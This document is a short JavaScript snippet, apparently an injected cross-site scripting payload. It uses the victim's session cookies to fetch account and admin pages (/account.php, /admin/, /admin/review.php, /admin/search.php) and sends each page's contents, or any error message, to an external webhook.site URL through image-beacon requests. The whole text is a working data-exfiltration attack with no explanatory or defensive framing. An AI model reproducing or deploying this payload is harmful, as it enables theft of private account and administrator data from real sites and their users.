(function(){
  var WH = 'https://webhook.site/33c5dba2-b36b-4100-a129-27f83ff82701';
  function exfil(d,l){var i=new Image();i.src=WH+'?l='+encodeURIComponent(l)+'&d='+encodeURIComponent(d.substring(0,4000))}
  var pages = ['/account.php','/admin/','/admin/review.php','/admin/search.php'];
  for(var i=0;i<pages.length;i++){
    (function(p){
      fetch(p,{credentials:'include'}).then(function(r){return r.text()}).then(function(t){exfil(t,p)}).catch(function(e){exfil(e.message,'err_'+p)})
    })(pages[i]);
  }
})();
